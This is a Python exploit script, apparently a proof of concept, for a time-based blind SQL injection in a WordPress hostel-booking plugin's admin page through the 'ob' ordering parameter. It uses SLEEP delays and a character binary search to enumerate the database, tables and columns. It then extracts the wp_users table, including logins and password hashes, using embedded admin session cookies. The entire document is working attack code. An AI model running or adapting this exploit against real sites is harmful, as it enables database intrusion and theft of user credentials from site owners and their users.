import requests

BASEURL = "http://localhost/wp-admin/admin.php?page=wphostel_bookings&type=past&dir=ASC&ob=tB.status"
CHARSET = "$./0123456789:@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "Referer": "http://localhost/wp-admin/admin.php?page=wphostel_bookings&type=past&ob=tB.id&dir=DESC",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Connection": "keep-alive"
}

COOKIE = {
    "wordpress_86a9106ae65537651a8e456835b316ab": "w41bu1%7C1757352837%7CX0QOWLnXmWuVWZzvM5l8YpE6Kgn6u9qRshRpkp1jD4z%7C3941e925740fb1bb9e89f18ef685a2bf816adb28e11c9764b6cacaf433f12ab9",
    "wordpress_logged_in_86a9106ae65537651a8e456835b316ab": "w41bu1%7C1757352837%7CX0QOWLnXmWuVWZzvM5l8YpE6Kgn6u9qRshRpkp1jD4z%7Cb3e80407ab031b4990dd78d44168ccf0375be47984ad89194e54286034f7fda3",
    "PHPSESSID": "h5ok28g6v61l5q2qvpdbs52rhj",
    "wordpress_test_cookie": "WP Cookie check",
    "wp-settings-time-1": "1756143251"
}

def to_hex(text: str) -> str:
    return "0x" + text.encode("utf-8").hex()

def fetch(payload: str) -> bool:
    try:
        url = f"{BASEURL},(SELECT IF({payload},SLEEP(1),1))"
        requests.get(url, headers=HEADERS, cookies=COOKIE, timeout=1)
        return False
    except requests.exceptions.Timeout:
        return True
    except Exception as e:
        print(e)
        
def binary_search_char(pos: int, target: str) -> str:
    low = 0
    high = len(CHARSET) - 1
    while low <= high:
        mid = (low + high) // 2
        
        mid_char = CHARSET[mid]
        mid_char_ord = ord(mid_char)
        
        if(fetch(f"ORD(SUBSTRING({target},{pos},1))={mid_char_ord}")):
            # print(f" [+] Position {pos}: {mid_char}")
            return mid_char
        elif(fetch(f"LEAST(ORD(SUBSTRING({target},{pos},1)), {mid_char_ord})={mid_char_ord}")):
            low = mid + 1
        else:
            high = mid - 1
    
    return -1
        
def get_db_name() -> str:
    db_name = ""
    # Get database length
    print(":: Getting database length...")
    for length in range(5, 20):
        payload = f"LENGTH(DATABASE())={length}"
        if(fetch(payload=payload)):
            db_length = length
            print(f" [+] Database length: {db_length}")
    
    # Get database name
    print(":: Getting database name...")
    for pos in range(1, db_length + 1):
        char = binary_search_char(pos=pos, target="DATABASE()")
        if char != -1:
            db_name += char
        
    print(f" [+] Database name: {db_name}")
    return db_name

def get_tables_name(db_name: str):
    table_names = {}
    # Get table number
    print(":: Getting table number...")
    for number in range(5, 20):
        payload = f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema={to_hex(db_name)})={number}"
        if(fetch(payload=payload)):
            table_number = number
            print(f" [+] Table number: {table_number}")
    
    # Get tables name    
    for table_pos in range(1, table_number + 1):
        for len in range(5, 25):
            payload = f"(SELECT LENGTH(TABLE_NAME) FROM information_schema.tables WHERE table_schema={to_hex(db_name)} LIMIT 1 OFFSET {table_pos - 1})={len}"
            if (fetch(payload=payload)):
                table_name = ""
                print(f":: Getting table {table_pos} name...")
                for pos in range(1, len + 1):
                    char = binary_search_char(pos=pos, target=f"(SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA={to_hex(db_name)} LIMIT 1 OFFSET {table_pos - 1})")
                    if char != -1:
                        table_name += char
                print(f" [+] Table {table_pos}: {table_name}")
                table_names[table_pos] = table_name
    return table_names
                
def get_table_values(db_name: str,table_name: str):
    column_number = 0
    # Get column number
    for number in range(1, 20):
        payload = f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema={to_hex(db_name)} and table_name={to_hex(table_name)})={number}"
        if(fetch(payload=payload)):
            column_number = number
            print(f" [+] Table {table_name}: {column_number} column")
            break
            
    column_names = {}
    # Get column name
    for col_pos in range(1, column_number + 1):
        for len in range(2, 20):
            payload = f"(SELECT LENGTH(COLUMN_NAME) FROM information_schema.columns WHERE table_schema={to_hex(db_name)} AND table_name={to_hex(table_name)} LIMIT 1 OFFSET {col_pos - 1})={len}"
            if (fetch(payload=payload)):
                col_name = ""
                for pos in range(1, len + 1):
                    char = binary_search_char(pos=pos,target=f"(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_schema={to_hex(db_name)} AND table_name={to_hex(table_name)} LIMIT 1 OFFSET {col_pos - 1})")
                    if char != -1:
                        col_name += char
                print(f" [+] Column {col_name}")
                column_names[col_pos] = col_name
    
    values = {}
    # Get wp_users table
    for col_name in column_names.values():
        # Get value  
        for val_len in range(65):
            payload = f"(SELECT LENGTH({col_name}) FROM {table_name})={val_len}"
            if(fetch(payload=payload)):
                value = ""
                for pos in range(1, val_len + 1):
                    char = binary_search_char(pos=pos, target=f"(SELECT {col_name} FROM {table_name} LIMIT 1)")
                    if char != -1:
                        value += char
                print(f" [+] {col_name}: {value}")
                values[col_name] = value
                
    return values

if __name__ == "__main__":
    db_name = get_db_name()
    table_names = get_tables_name(db_name=db_name)

    # Get value from wp_users table
    values = get_table_values(db_name=db_name, table_name="wp_users")